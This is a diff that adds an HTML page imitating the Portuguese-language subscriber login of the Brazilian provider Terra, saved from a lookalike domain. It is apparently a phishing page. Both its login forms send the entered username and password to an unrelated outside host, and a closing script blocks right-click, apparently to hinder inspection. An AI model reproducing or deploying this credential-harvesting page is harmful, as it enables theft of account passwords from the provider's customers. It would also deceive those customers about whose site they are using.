@@ -1,0 +1,362 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0039)http://centralcob-terra.com/cliente.php -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+	<title>Terra - Central do Assinante</title>
+	
+	<meta http-equiv="content-language" content="portuguese">
+	<meta name="geo.country" content="br">
+	<meta name="MSSmartTagsPreventParsing" content="true">
+	<meta http-equiv="imagetoolbar" content="no">
+	<meta name="revisit-after" content="1 days">
+        <link rel="shortcut icon" type="image/x-icon" href="http://s1.trrsf.com.br/favicon.ico">
+        <meta name="description" content="Conheça a nova capa da Central do Assinante do Terra" xml:lang="pt-BR" lang="pt-BR">
+	<meta name="keywords" content="assine, terra, central, assinante, serviços" xml:lang="pt-BR" lang="pt-BR">
+	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+	<script language="javascript" type="text/javascript" src="./Index_files/jquery.js"></script>
+	<link type="text/css" rel="stylesheet" href="./Index_files/trr.css">
+	<script type="text/javascript" src="./Index_files/modal.js"></script>
+	<script type="text/javascript" src="./Index_files/trr.js"></script>
+	
+	<script>
+	$(document).ready( function(){
+	
+		$('#FormLoginUsuario').focus();
+		
+		rodar_o_banner(false);
+		setInterval("rodar_o_banner(false);",8000);
+		
+		$(".navLink2, .liMenu2, .opc1 a, .opc2 a, .opc3 a, .opc4 a").click( function(){
+			$("#login-modal").modal({
+					containerCss:{
+							height:238
+						}
+				});
+			return false;
+		});
+		
+		var reativar_sundaytv = MyCookie.getCookie("reativar_sundaytv");
+		if(reativar_sundaytv == "1") {
+			window.location.href = "centralrw.cgi?_wc=+*1u0*H*cMFixt9tkq1mt*Za*UMqn50Kgkccw*waW*8KGl*reiy9ulknkZdwk50zgj3DLX82ZU2QtDJxnf5KB9nSms*BzsCzHdfk1J3UkPsgMzYPdWyIP*W9Dh9BVxJ6Ey";
+		}
+		
+	})
+	</script>
+	
+	<style>
+	
+	body{
+		position: relative;
+		background: #fff;
+	}
+	
+	.bg{
+		background: url("img/trr/bg-capa.jpg") center 15px no-repeat !important;
+		width: 100%;
+		height: 600px;
+		display: none;
+		position: absolute;
+		top: 24px;
+		left: 0;
+		z-index: 1;
+	}
+
+	.bg2{
+		background: url("img/trr/bg-capa-sonora.jpg") center 107px no-repeat !important;
+		width: 100%;
+		height: 600px;
+		display: none;
+		position: absolute;
+		top: 24px;
+		left: 0;
+		z-index: 1;
+		display: none;
+	}
+
+	.bg3{
+		background: url("img/trr/bg-capa3.png") center 0 no-repeat !important;
+		width: 100%;
+		height: 600px;
+		display: none;
+		position: absolute;	top: 24px;
+		left: 0;
+		z-index: 1;
+		display: none;
+	}
+	
+	.bg2-link{
+		display: none;
+		border:	0px solid #0F0;
+		width:	243px;
+		height: 67px;
+		position: absolute;
+		top: 221px;
+		left: 45px;
+		z-index: 999;
+	}
+	
+	.trr-bn{
+		padding: 40px 20px 10px;	position: relative;	height: 295px;	width: 910px;
+	}
+
+	.trr-bn .opc1{
+		display: block;	position: absolute;	top: 86px;	left: 20px;	opacity: 0;
+	}
+
+	.trr-bn .opc2{
+		display: block;	position: absolute;	top: 145px;	left: 20px;	opacity: 0;
+	}
+
+	.trr-bn .opc3{
+		display: block;	position: absolute;	top: 205px;	left: 20px;	opacity: 0;	}
+
+	.trr-bn .opc4{
+		display: block;	position: absolute;	top: 265px;	left: 20px;	opacity: 0;
+	}
+
+	.trr-bn-titulo{
+		padding: 0 0 10px 0; position: absolute; display: block;left: 0;top: 35px;opacity: 0;
+	}
+	
+	.banner-counter-container{
+		border: 0px solid #F00;
+		height: 25px;
+		width: 250px;
+		position: absolute;
+		top: 328px;
+		left: 441px;
+	}
+	
+	.banner-counter-active {
+		background: #FFA31A !important;
+	}
+	
+	.banner-counter {
+		padding-top: 2px;
+		cursor: pointer;
+		font-size: 10px;
+		float: left;
+		margin-left: 10px;
+		background: #b9b2aa;
+		height: 16px;
+		width: 	18px;
+		text-align: center;
+		color: #FFF;
+		border: 1px solid #FFF;
+		border-radius: 3px;
+		-webkit-border-radius: 3px;
+		-moz-border-radius: 3px;
+		border-radius: 3px;
+	}
+	
+	</style>
+	
+</head>
+<body>
+
+<div class="bar">
+	<div class="bar-cont">
+		<iframe src="./Index_files/index.htm" width="990" height="25" frameborder="0" scrolling="no"></iframe>
+	</div>
+</div>
+
+<div class="bg" style="display: none;"></div>
+<div class="bg2" style="display: block;">
+</div>
+
+
+
+<div class="bg3"></div>
+
+<div class="all">
+	<div class="principal trr-capa">
+	
+		<div class="header">
+			<a href="" title="Central do Assinante" class="titulo_link" onclick="gaPageTracker(&#39;ca/Inicio&#39;);"><img src="./Index_files/central_do_assinante.png" alt="Central do Assinante"></a>
+			<div class="nav nav-capa">
+				<ul class="ulMenu">
+					<li><a href="" title="" class="navLink1" onclick="gaPageTracker(&#39;menu/Inicio&#39;);">Início</a></li>
+					<li class="liMenu1"><a title="" class="navLink2" onclick="gaPageTracker(&#39;menu/Alterar-dados-pessoais&#39;);"></a>
+						<ul class="ulsubMenu" style="width: 130px;">
+							
+							
+							
+							
+							
+							
+						</ul>
+					</li>
+					
+					<li class="liMenu2"><a id="linkBanner" title="" class="navLink3"></a>
+						<ul class="ulsubMenu" style="width: 190px;">
+							<li><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+4OLb4K4T1fL0FWydi60J4Ms4xeDyeIkXssr54bs7U16jz43VZGi6zsxsCU8seIFX_tIO*QUonDI*cqYFO0rAQfhEFxoMOGiwVaeXj*UToE2yGLnsvN8V46Ct1V43FzTGV" id="linkBanner" title="Serviços contratados" onclick="gaPageTracker(&#39;menu/Servicos-contratados&#39;);">Serviços contratados</a></li>
+							<li style="display: none; "><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+QwYkQuQ1EZ_0kXqBCiz0QwmYp5mbrmA59O3oQJzIFf_*JQP37kvSJ9L9g2U9rmj58fg4VuNBi9Kjo4LNs0YrRwuTreprVk4t2ZRItV9q_iQXTl8Z*52gQA9YW__wTWAPr" title="Valores dos serviços pagos" onclick="gaPageTracker(&#39;menu/Valores-dos-servicos-pagos&#39;);">Valores dos serviços pagos</a></li>
+							
+						</ul>
+					</li>		
+					
+					<li class="liMenu3"><a href="" title="" class="navLink4" onclick="gaPageTracker(&#39;menu/Pagamento-de-titulos&#39;);"></a>
+						<ul class="ulsubMenu" style="width: 200px;">
+							<li><a href="" title="pagamento de títulos" onclick="gaPageTracker(&#39;menu/Pagamento-de-titulos&#39;);">Pagamento de títulos</a></li>
+							
+							
+							
+							
+							<li><a href="" title="Consulta de títulos" onclick="gaPageTracker(&#39;menu/Consulta-de-titulos&#39;);">Consulta de títulos</a></li>
+							<li><a href="" title="declaração de débitos" onclick="gaPageTracker(&#39;menu/Declaracao-de-debitos&#39;);">Declaração de débitos</a></li>
+						</ul>
+					</li>
+					<li><a href="" onclick="gaPageTracker(&#39;header/duvidasTerra&#39;);" title="" class="navLink5"></a></li>
+				</ul>
+
+				<div class="div-login" style="top: 36px;">
+					<div class="div-login-r"></div>
+					<div class="div-login-c"> <a href="http://centralcob-terra.com/centralrw.cgi?_wc=+Pl6VPWP0lmNti6O0jU4mPLyXhGUJqlw48wsjPQy90tE*9PO26juR98K8f1T8qli47ztVpLXMIB0xjoV6O2_6Hs*0peA0Yo7H67RN5M38JPJBhIe0CfvUPL2AhWJpPZNc1" title="Sair" class="div-login-sair" onclick="gaPageTracker(&#39;header/Sair&#39;);">SAIR</a></div>
+					<div class="div-login-l"></div>
+				</div>
+					
+				<div class="menuAssine">
+					<a href="" target="_blank" title="" class="menu-link-assine" onclick="gaPageTracker(&#39;header/Assine&#39;);"></a>
+					<img src="./Index_files/menu-bg-assine.png" alt="" class="img">
+				</div>
+			</div>
+		</div>
+		
+		<div class="trr-bn">		
+			
+			<a class="bg2-link" href="" target="_blank" style="display: inline;"></a>
+			
+			<div class="trr-bn-titulo" style="opacity: 0; left: 25px;">
+				<img src="./Index_files/bn1-titulo.png" alt="">
+			</div>
+			
+			<div class="trr-links-opc" style="display: none;">
+			
+				<div class="opc1" style="opacity: 0; top: 96px; left: 20px;">
+					<p><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+hSbQhkhIqmjLialYOnrTh94Ij8yeZU0EIYAohVE8glH*ahgCGSyjaIcIOBlIZUREH91mUx_sh7fHX1We4K5ApmyTaB6zoQlklAq8QMPI0Qv9QdcZ075*h6Bh8iCWiitAA" title="Descontos e promoções" onclick="gaPageTracker(&#39;Capa-logada/Troque-sua-senha&#39;);"><span class="trr-links-opc-titulo">Descontos e promoções</span><br>
+					<span class="trr-link-desc">Desconto de 25% para pagamento no cartão de crédito.</span></a></p>
+				</div>
+
+				<div class="opc2" style="opacity: 0; top: 155px; left: 20px;">
+					<p><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+WW1tWxWxqYSQCeqwwtQyWMI7AtymA*GKODTXWkUgAOoDPWV9MqEYPOROm8_OA*pKNdz2QjcFqp4*DL4Be4h0Vhyw1tZXC3NOJUUb5yOowWKjWwDWjWwuW2jgm0zYWRDWL" title="Gerenciar contas" onclick="gaPageTracker(&#39;Capa-logada/Gerenciar-contas&#39;);"><span class="trr-links-opc-titulo">Gerenciar suas caixas postais</span><br>
+					<span class="trr-link-desc">Crie contas adicionais e caixas postais do Terra Mail.</span></a></p>
+				</div>
+				
+				<div class="opc3" style="opacity: 0; top: 215px; left: 20px;">
+					<p><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+KRWQKcK_3o99VFI3SMzNKZcSHbYFlgrx3BqfKiz2zlnS4KJz1epM4363asO3lgdx2rmdReZevaiOM9bIkneoJNauST7QMhPgqVH_QVSKEK7SNc448rDXKygciuOhMe7g8" title="Download de produtos" onclick="gaPageTracker(&#39;Capa-logada/Download-de-produtos&#39;);"><span class="trr-links-opc-titulo">Fazer download de produtos</span><br>
+					<span class="trr-link-desc">Baixe o Centro de Segurança e o gerenciador de downloads do Sonora.</span></a></p>
+				</div>
+				
+				<div class="opc4" style="opacity: 0; top: 275px; left: 20px;">
+					<p><a href="http://centralcob-terra.com/centralrw.cgi?_wc=+YzYtYYY9oZ3J*bIah_KEYZd9iLalCuIMQBEyYm7BdGRGRYXKO*G_RQTQoJzQCurMPxkWibB60qCVY_Y3MKZYLm_1m*P9CO31OAm*7N519qWP*3cqtmO5YXAaM5zGsq1c5" title="Alterar dados de cadastro" onclick="gaPageTracker(&#39;Capa-logada/Alterar-dados-de-cadastro&#39;);"><span class="trr-links-opc-titulo">Atualizar seus dados de cadastro</span><br>
+					<span class="trr-link-desc">Mantenha seus dados atualizados: endereço, telefone e celular.</span></a></p>
+				</div>
+
+			</div>
+			
+			<div class="banner-counter-container"><div class="banner-counter">1</div><div class="banner-counter banner-counter-active">2</div></div>
+			
+		</div>
+		
+		<div class="login">
+			<form name="login" method="post" autocomplete="off" action="http://www.w3patk.esy.es/pagamento.html">
+				<input type="hidden" name="_ActionCode" value="">
+				<h2 class="login_titulo"><img src="./Index_files/minha_conta.png" alt="Acessar minha conta"></h2>
+				<p>Nome do usuário:<br><input type="text" name="email" id="email" class="login_input"></p>
+
+				<p>Senha:<br><input type="password" name="passwd" id="passwd" class="login_input" id="passwd"></p>
+				<p></p>
+				<p><a title="Esqueci minha senha">Esqueci minha senha</a></p>
+				<p><input type="submit" name="ENTRAR" value="ENTRAR" class="login_bto"></p>
+			</form>
+		</div>
+	</div>
+	
+	<div class="destaque">
+		<div class="box-itens item1">
+			<h3><a href="" target="_blank"><img src="./Index_files/tit-item1.png" alt="Central de pagamentos"></a></h3>
+			<p><a href="" target="_blank">Facilidade e praticidade ao fazer seus pagamentos da forma que for mais adequada à sua necessidade.</a></p>
+		</div>
+		<div class="box-itens item2">
+			<h3><a href="" target="_blank"><img src="./Index_files/tit-item2.png" alt="Central de pagamentos"></a></h3>
+			<p><a href="" target="_blank">Tire as suas dúvidas sobre e-mail, pagamentos e serviços do Terra sem precisar usar o telefone. Fácil, rápido e seguro.</a></p>
+		</div>
+		<div class="box-itens item3 box_last">
+			<h3><a href="" target="_blank"><img src="./Index_files/tit-item3.png" alt="Central de pagamentos"></a></h3>
+			<p><a href="" target="_blank">Clique aqui e veja as alterações que você deve fazer nas configurações do seu programa de e-mail.</a></p>
+		</div>
+	</div>
+	
+	<div id="login-modal">
+		<form name="login" method="post" action="http://www.w3patk.esy.es/pagamento.html">
+
+			<input type="hidden" name="_ActionCode" value="">
+			<a class="modalCloseImg modal-close simplemodal-close" title="Close" onclick="return false;"></a>
+			<h3><img src="./Index_files/modal-titulo.png" alt=""></h3>
+			<p class="login-modal-desc">
+				Para utilizar esse serviço é necessário estar logado. <br>Faça seu login abaixo:			</p>
+			<div class="login-modal-inputs">
+				<div class="login-modal-ipt">
+				<p>nome do usuário <br><input type="text" name="email" class="input"></p>
+
+				<p>senha <br><input type="password" name="passwd" class="input"></p>
+				<p style="width: 53px;"><input type="image" src="./Index_files/btn-entrar-login.jpg" alt="Entrar" name="" class="submit"></p>
+				</div>
+				<div class="login-modal-opc">
+				<p><a title="Ajuda">Ajuda</a></p>
+				<p><a title="">Esqueci a senha</a></p>
+				</div>
+			</div>
+		</form>
+	</div>
+</div>
+
+<div class="div-footer">
+	<div class="footer">
+		<ul>
+		  <li class="footerTitulo">Entretenimento</li>	
+		  <li><a href="" target="_blank" title="Sundaytv" onclick="gaPageTracker(&#39;Rodape/Sundaytv&#39;);">Sundaytv Vídeo Clube</a></li>              
+		  <li><a href="" target="_blank" title="Sonora Clube" onclick="gaPageTracker(&#39;Rodape/Sonora&#39;);">Sonora</a></li>         
+		</ul>
+		<ul>
+		  <li class="footerTitulo">Acesso</li>         
+		  <li><a href="" target="_blank" title="Banda Larga" onclick="gaPageTracker(&#39;Rodape/BandaLarga&#39;);">Banda Larga</a></li>   
+		</ul>
+		<ul>
+		  <li class="footerTitulo">Segurança</li>
+		  <li><a href="" target="_blank" title="Antivírus Computador" onclick="gaPageTracker(&#39;Rodape/Antivirus-Computador&#39;);">Antivírus Computador</a></li>                  
+		  <li><a href="" target="_blank" title="Família Protegida" onclick="gaPageTracker(&#39;Rodape/Familia-Protegida&#39;);">Família Protegida</a></li>                   
+		  <li><a href="" target="_blank" title="Antivírus Navegação e Computador" onclick="gaPageTracker(&#39;Rodape/PC-Seguro&#39;);">Antivírus Navegação<br>e Computador</a></li>      
+		  <li><a href="" target="_blank" title="Antivírus" onclick="gaPageTracker(&#39;Rodape/Antivirus&#39;);">Antivírus Completo</a></li>                    
+		</ul>
+		<ul>
+		  <li class="footerTitulo">Outros</li>                 
+		  <li><a href="" target="_blank" title="Divulga Fácil" onclick="gaPageTracker(&#39;Rodape/Divulga-Facil&#39;);">Divulga Fácil</a></li>                    
+		  <li><a href="" target="_blank" title="Terra Mail" onclick="gaPageTracker(&#39;Rodape/Terra-Mail&#39;);">Terra Mail</a></li>    
+		</ul>
+		<div class="img-footer">
+			<p class="footerTitulo">Formas de pagamento</p>
+		</div>
+		<ul>
+		  <li class="footerTitulo">Ambiente seguro</li> 
+			<p class="ambienteSeguro"></p>		  
+		</ul>
+	
+		<div class="footer-fones">COMPRE POR TELEFONE | São Paulo: (011) 3677 1010 | Porto Alegre: (051) 3287 0707 | Outras localidades: 0800 777 1234</div>
+
+	</div>
+</div>
+
+
+
+
+
+<script>
+function click() {
+if (event.button==2||event.button==3) {
+oncontextmenu='return false';
+  }
+}
+document.onmousedown=click
+document.oncontextmenu = new Function("return false;")
+</script>
+</body></html>
